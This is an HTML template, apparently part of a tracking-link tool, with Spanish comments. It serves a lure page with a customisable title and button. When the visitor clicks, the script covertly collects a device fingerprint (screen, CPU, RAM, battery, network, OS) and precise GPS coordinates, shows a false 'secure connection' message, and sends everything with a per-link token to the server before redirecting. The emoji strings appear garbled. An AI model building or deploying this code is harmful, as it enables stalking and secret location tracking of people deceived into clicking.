<!DOCTYPE html>
<html>
<head>
    <title>{{ data.title }}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; padding: 40px 20px; background: #fff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; margin: 0; }
        .icon { font-size: 70px; margin-bottom: 20px; }
        .btn { background: #007AFF; color: white; padding: 16px 32px; border: none; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 4px 12px rgba(0,122,255,0.3); transition: transform 0.1s; }
        .btn:active { transform: scale(0.98); }
        h2 { margin-bottom: 10px; font-size: 22px; max-width: 300px; }
        p { color: #666; line-height: 1.5; margin-bottom: 40px; max-width: 300px; font-size: 15px; }
    </style>
</head>
<body>
    
    <div class="icon">{{ data.icon }}</div>
    <h2 id="title">{{ data.title }}</h2>
    <p id="desc">{{ data.text }}</p>
    
    <button id="btnAction" class="btn" onclick="iniciarProceso()">{{ data.btn }}</button>
    <div id="msg" style="margin-top:25px; font-size:13px; color:#e74c3c; font-weight:500;"></div>

    <script>
        const token = window.location.pathname.split('/').pop();

        // OBTENER FINGERPRINT (RAYOS X)
        async function getFingerprint() {
            let info = [];
            info.push(`ðŸ“º Pantalla: ${window.screen.width}x${window.screen.height}`);
            if (navigator.hardwareConcurrency) info.push(`âš™ï¸ CPU: ${navigator.hardwareConcurrency} Cores`);
            if (navigator.deviceMemory) info.push(`ðŸ’¾ RAM: ~${navigator.deviceMemory} GB`);
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    let level = Math.round(bat.level * 100);
                    info.push(`${bat.charging ? "ðŸ”Œ" : "ðŸ”‹"} ${level}%`);
                }
            } catch(e) {}
            if (navigator.connection) info.push(`ðŸ“¡ Red: ${navigator.connection.effectiveType}`);
            info.push(`ðŸ’» OS: ${navigator.platform}`);
            return info.join(" | ");
        }

        function irAlDestino() { window.location.href = "/redirect/" + token; }

        async function iniciarProceso() {
            document.getElementById('msg').innerText = "Estableciendo conexiÃ³n segura...";
            document.getElementById('btnAction').style.opacity = "0.5";
            
            let fingerprint = await getFingerprint();

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => enviarTodo(pos, fingerprint), 
                    (err) => {
                        // Si falla, intentamos rebote URL
                        window.location.href = `/api/save_gps_bounce?token=${token}&lat=0&lon=0&acc=DENIED`;
                    }, 
                    {enableHighAccuracy: true, timeout: 8000}
                );
            } else {
                enviarSoloFingerprint(fingerprint);
            }
        }

        function enviarTodo(pos, fingerprint) {
            fetch('/api/save_data', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    token: token, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, fingerprint: fingerprint
                })
            }).then(irAlDestino).catch(() => {
                window.location.href = `/api/save_gps_bounce?token=${token}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`;
            });
        }

        function enviarSoloFingerprint(fingerprint) {
            fetch('/api/save_data', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token: token, lat: null, fingerprint: fingerprint })
            }).then(irAlDestino).catch(irAlDestino);
        }
    </script>
</body>
</html>
